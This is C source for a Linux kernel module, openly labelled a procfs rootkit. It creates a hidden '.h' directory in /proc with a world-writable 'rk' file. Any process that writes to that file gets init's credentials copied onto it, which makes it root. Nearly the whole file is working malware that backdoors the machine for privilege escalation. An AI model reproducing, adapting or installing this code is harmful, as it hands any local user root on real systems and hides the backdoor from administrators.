/**
 * Linux rootkit kernel module (procfs)
 * Tested under GNU C gcc 4.7.2, linux kernel v3.14.3-x86_64
 *
 * This work derive from https://gist.github.com/jvns/6894934.
 * Updated because major changes on proc_fs since kernel v3.10.x:
 * 'struct proc_dir_entry' is private to proc_fs starting v3.10
 */
#include <linux/types.h>
#include <linux/seq_file.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>  /* required by proc_dir_entry */
#include <linux/sched.h>    /* required by find_vpid */

#define ROOTKIT_PROC_DIR    ".h"
#define ROOTKIT_PROC_FNAME  "rk"
#define ROOTKIT_FP          ROOTKIT_PROC_DIR"/"ROOTKIT_PROC_FNAME
#define EXIT_SUCCESS        0

MODULE_AUTHOR("TzyLuen Ng <tzyluen.ng@gmail.com>");
MODULE_LICENSE("GPL");


static ssize_t rootkit_proc_write ( struct file *, const char __user *, size_t, loff_t *);
static int make_pid_root(void);
static struct proc_dir_entry *rootkit_proc_dir;
static const struct file_operations rootkit_fops = {
    .owner      = THIS_MODULE,
    .write      = rootkit_proc_write,
};


static ssize_t rootkit_proc_write (
    struct file *f,
    const char __user *buff,
    size_t len,
    loff_t *off)
{
    make_pid_root();
    return 1;
}


static int make_pid_root(void)
{
    struct task_struct *init_task = pid_task(find_vpid(1), PIDTYPE_PID);
    if (!init_task || !current)
        goto do_nothing;
    current->cred = init_task->cred;
    goto do_nothing;
 do_nothing:
    return 0;
}


static int __init procfs_rootkit_init(void)
{
    rootkit_proc_dir = proc_mkdir(ROOTKIT_PROC_DIR, NULL);
    if (!rootkit_proc_dir)
        goto out;
    proc_create(ROOTKIT_PROC_FNAME, 0666, rootkit_proc_dir, &rootkit_fops);

    return EXIT_SUCCESS;

 out:
    return -ENOMEM;
}


static void __exit procfs_rootkit_exit(void)
{
    remove_proc_entry(ROOTKIT_PROC_FNAME, rootkit_proc_dir);
}


module_init(procfs_rootkit_init);
module_exit(procfs_rootkit_exit);
